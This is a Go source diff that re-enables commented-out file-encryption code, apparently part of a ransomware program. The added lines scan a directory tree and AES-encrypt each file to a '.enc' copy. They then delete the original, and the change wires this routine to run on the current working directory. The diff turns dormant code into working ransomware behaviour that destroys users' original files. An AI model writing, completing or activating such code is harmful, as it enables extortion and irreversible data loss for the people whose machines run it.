@@ -17,16 +17,16 @@ func LockFilesInDir(startDirPath string, skipHiddenDirs bool, encryptedAESKey []
 	//scan only non hidden directories
 	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
 	// filesToEncrypt := ScanFilesInDirWithLockAdd(startDirPath, skipHiddenDirs, encryptedAESKey)
-	filesToEncrypt, _ := scan.ScanNoSideEffects(startDirPath, skipHiddenDirs)
+	filesToEncrypt := scan.ScanFilesInDirWithLockAdd(startDirPath, skipHiddenDirs, encryptedAESKey)
 
 	wg := sync.WaitGroup{}
 	wg.Add(len(filesToEncrypt))
 
 	for _, filePath := range filesToEncrypt {
 		go func(filePath string) {
-			// encryptedFileData := enc.EncryptFileAES(AESKey, filePath)
-			// os.WriteFile(filePath+".enc", encryptedFileData, 0644)
-			// os.Remove(filePath)
+			encryptedFileData := enc.EncryptFileAES(AESKey, filePath)
+			os.WriteFile(filePath+".enc", encryptedFileData, 0644)
+			os.Remove(filePath)
 			wg.Done()
 		}(filePath)
 	}
@@ -39,7 +39,7 @@ func RunEncryptForCurrentDir(encryptedAESKey []byte, AESKey []byte) (fileList []
 	//get pwd
 	currentDir, err := os.Getwd()
 	ErrCheck(err)
-	// LockFilesInDir(currentDir, true, encryptedAESKey, AESKey)
+	LockFilesInDir(currentDir, true, encryptedAESKey, AESKey)
 	pl("current dir: ", currentDir)
 	return fileList
 }
